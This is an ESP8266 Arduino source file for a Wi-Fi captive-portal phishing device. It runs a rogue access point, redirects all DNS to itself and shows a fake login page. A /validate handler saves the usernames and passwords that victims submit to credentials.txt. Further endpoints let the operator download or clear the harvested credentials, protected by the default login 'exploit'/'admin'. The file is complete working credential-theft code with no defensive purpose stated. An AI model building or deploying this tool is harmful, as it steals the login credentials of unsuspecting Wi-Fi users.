#include <Arduino.h>
#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include "FS.h"
#include "WebHTML.h"

IPAddress apIP(18, 18, 18, 18);
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

struct Config 
{
  char ssid[64];
  char pass[64];
  char p_user[64];
  char p_pass[64];
};

Config config;   

void defaultConfig()
{
  File file = LittleFS.open("/config.json", "w");
  if (!file) {
  Serial.println("Failed to open config for writing");
  }
  
  StaticJsonDocument<256> doc;
  doc["ssid"] = config.ssid;
  doc["pass"] = config.pass;
  doc["p_user"] = config.p_user;
  doc["p_pass"] = config.p_pass;
  if (serializeJson(doc, file) == 0) {
  Serial.println(F("Failed to write to file"));
  }
  file.close();

  loadConfig();
}

void loadConfig()
{
   File file = LittleFS.open("/config.json", "r");
   if (!file) 
   {
    Serial.println("Failed to open config for reading");
    Serial.println("Formatting LittleFS filesystem");
    LittleFS.format();
    delay(5000);
    LittleFS.begin();
    defaultConfig();
  }

   StaticJsonDocument<512> doc;
   DeserializationError error = deserializeJson(doc, file);
   if (error)
   Serial.println(F("DeserializationError"));
   
   strlcpy(config.ssid,                  
          doc["ssid"] | "expv2",  
          sizeof(config.ssid));       

   strlcpy(config.pass,                
          doc["pass"] | "1234567890",
          sizeof(config.pass));       

   strlcpy(config.p_user,               
          doc["p_user"] | "exploit", 
          sizeof(config.p_user));        

   strlcpy(config.p_pass,                
          doc["p_pass"] | "admin", 
          sizeof(config.p_pass));        
          
   file.close();
}


void exploitCaptive() {
    webServer.send(200, "text/html", eXploit_Captive);
}

void exploitConfig() {
    if(!webServer.authenticate(config.p_user, config.p_pass))
    return webServer.requestAuthentication();
    webServer.send(200, "text/html", eXploit_Config);
}


void setup() {
   Serial.begin(115200);
   Serial.println("");
   delay(1000);
   Serial.println("Mount LittleFS");
   if (!LittleFS.begin()) 
   {
   Serial.println("LittleFS mount failed");
   Serial.println("Formatting LittleFS filesystem");
   LittleFS.format();
   delay(5000);
   LittleFS.begin();
    }
   loadConfig();
    
   Serial.print("Configuring access point...");
   WiFi.softAP(config.ssid, config.pass);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   dnsServer.start(DNS_PORT, "*", apIP);

   pinMode(16, OUTPUT);   
   pinMode(2, OUTPUT);  
   digitalWrite(16,HIGH);
   digitalWrite(2,LOW); 

   webServer.onNotFound([]() 
    {
    exploitCaptive();
    });

   webServer.begin();
 
   webServer.on("/", exploitConfig);

   webServer.on("/saveconfig", []() 
   {
   File file = LittleFS.open("/config.json", "w");
   if (!file) {
   Serial.println("Failed to open config for writing");
   }
  
   StaticJsonDocument<256> doc;
   if(webServer.arg("ssid") != "")
   doc["ssid"] = webServer.arg("ssid");

   if(webServer.arg("pass") != "")
   doc["pass"] = webServer.arg("pass");
   
   if(webServer.arg("p_user") != "")
   doc["p_user"] = webServer.arg("p_user");
   
   if(webServer.arg("p_pass") != "")
   doc["p_pass"] = webServer.arg("p_pass");
   
   if (serializeJson(doc, file) == 0) {
   Serial.println(F("Failed to write to file"));
   }
   file.close();

   Serial.println("Save config finished");
   
   });
 
   webServer.on("/validate", []() {
   File file = LittleFS.open("/credentials.txt", "a");
   if (!file) {
   Serial.println("Failed to write credentials");
   }
   if (file.print("\nUsername : " + webServer.arg("user"))) {
   Serial.println("Username Written");
   digitalWrite(16,LOW);
   digitalWrite(2,HIGH);
   } 
   else {
   Serial.println("\nUsername write failed");
   }
   if (file.print("\nPassword : " + webServer.arg("pass"))) {
   Serial.println("Password Written");
   }
   else {
   Serial.println("Password write failed");
   }
   delay(2000); 
   file.close();
   });   

   webServer.on("/credentials", []() {
   File download = LittleFS.open("/credentials.txt", "r");
   if (!download) {
   Serial.println("Failed to read credentials file");
   }
   if (download)
   {
      webServer.sendHeader("Content-Type", "text/text");
      webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
      webServer.sendHeader("Connection", "close");
      webServer.streamFile(download, "application/octet-stream");
      download.close();
   } 
   });

    webServer.on("/clear_cred", []() {
  
    File data = LittleFS.open("/credentials.txt", "r");
    if (!data) {
    Serial.println("Failed to read credentials file");
    }
    if (data) 
    {
    if (LittleFS.remove("/credentials.txt")) {
    Serial.println(F("File deleted successfully")); }
    }      
      
    });    

    webServer.on("/reboot", []() {
    Serial.println("Esp going to reboot");
    ESP.restart();      
    });


}

void loop()
{
  webServer.handleClient();
  dnsServer.processNextRequest();

}
